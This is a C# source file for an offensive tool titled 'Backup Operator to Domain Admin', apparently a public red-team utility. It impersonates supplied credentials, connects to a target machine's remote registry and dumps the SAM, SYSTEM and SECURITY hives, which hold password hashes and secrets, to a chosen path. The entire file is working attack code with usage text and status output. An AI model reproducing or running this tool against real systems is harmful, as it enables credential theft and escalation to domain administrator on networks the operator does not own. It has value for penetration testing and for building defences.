using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Security.Principal;
using System.ComponentModel;

class BOexp
{
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern bool LogonUser(
        string lpszUsername,
        string lpszDomain,
        string lpszPassword,
        int dwLogonType,
        int dwLogonProvider,
        out IntPtr phToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern int RegConnectRegistry(string machineName, UIntPtr hKey, out IntPtr phkResult);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern int RegOpenKeyEx(IntPtr hKey, string subKey, int options, int samDesired, out IntPtr phkResult);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern int RegSaveKey(IntPtr hKey, string fileName, IntPtr securityAttributes);

    private static string user, password, domain, path, target;

    private static void MakeToken()
    {
        if (!LogonUser(user, domain, password, 9, 0, out IntPtr token))
        {
            Console.WriteLine("LogonUser failed: " + Marshal.GetLastWin32Error());
            Environment.Exit(0);
        }
        if (!ImpersonateLoggedOnUser(token))
        {
            Console.WriteLine("ImpersonateLoggedOnUser failed: " + Marshal.GetLastWin32Error());
            Environment.Exit(0);
        }
    }

    private static void Exploit()
    {
        List<string> successfulExports = new List<string>();
        IntPtr hklm;
        IntPtr hkey;
        string[] hives = { "SAM", "SYSTEM", "SECURITY" };

        if (RegConnectRegistry(target, (UIntPtr)0x80000002, out hklm) != 0)
        {
            Console.WriteLine("RegConnectRegistry failed");
            Environment.Exit(0);
        }

        foreach (string hive in hives)
        {
            string outputPath = Path.Combine(path, hive);
            Console.WriteLine($"[*] Dumping {hive} hive to {outputPath}");
            if (RegOpenKeyEx(hklm, hive, 0x00000004 | 0x00000008, 0x20019, out hkey) != 0)
            {
                Console.WriteLine("[*] RegOpenKeyEx failed, but continuing...");
            }

            if (RegSaveKey(hkey, outputPath, IntPtr.Zero) == 0)
            {
                Console.WriteLine($"[+] Successfully exported {hive} to {outputPath}");
                successfulExports.Add(hive);
            }
            else
            {
                Console.WriteLine("[-] RegSaveKey failed");
            }
        }
        // 输出所有成功导出的 hive
        Console.WriteLine("\n[+] Successfully exported hives :");
        foreach (string exportedHive in successfulExports)
        {
            Console.WriteLine($"  - {exportedHive}");
        }
    }

    private static void PrintUsage()
    {
        Console.WriteLine(@"Backup Operator to Domain Admin (by @mpgn_x64)

  Mandatory argument:
    -t <TARGET>      \\computer_name
    -o <PATH>        Where to store the sam/system/security files

  Optional arguments:

    -u <USER>        Username
    -p <PASSWORD>    Password
    -d <DOMAIN>      Domain
    -h               help
");
    }

    public static void Main(string[] args)
    {

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-h":
                    PrintUsage();
                    return;
                case "-u":
                    if (++i < args.Length) user = args[i];
                    else { Console.WriteLine("Missing value for -u"); return; }
                    break;
                case "-p":
                    if (++i < args.Length) password = args[i];
                    else { Console.WriteLine("Missing value for -p"); return; }
                    break;
                case "-d":
                    if (++i < args.Length) domain = args[i];
                    else { Console.WriteLine("Missing value for -d"); return; }
                    break;
                case "-o":
                    if (++i < args.Length) path = args[i];
                    else { Console.WriteLine("Missing value for -o"); return; }
                    break;
                case "-t":
                    if (++i < args.Length) target = args[i];
                    else { Console.WriteLine("Missing value for -t"); return; }
                    break;
                default:
                    Console.WriteLine("Invalid argument: " + args[i]);
                    PrintUsage();
                    return;
            }
        }

        if (string.IsNullOrEmpty(target) || string.IsNullOrEmpty(path))
        {
            Console.WriteLine("Missing argument -t or -o");
            return;
        }
        if (!target.StartsWith("\\"))
        {
            Console.WriteLine("Target should start with \\");
            return;
        }
        if (!string.IsNullOrEmpty(user) && !string.IsNullOrEmpty(password) && !string.IsNullOrEmpty(domain))
        {
            Console.WriteLine("[*] Making user token");
            MakeToken();
            Console.WriteLine("[+] Making user token Success");
        }


        Exploit();
    }
}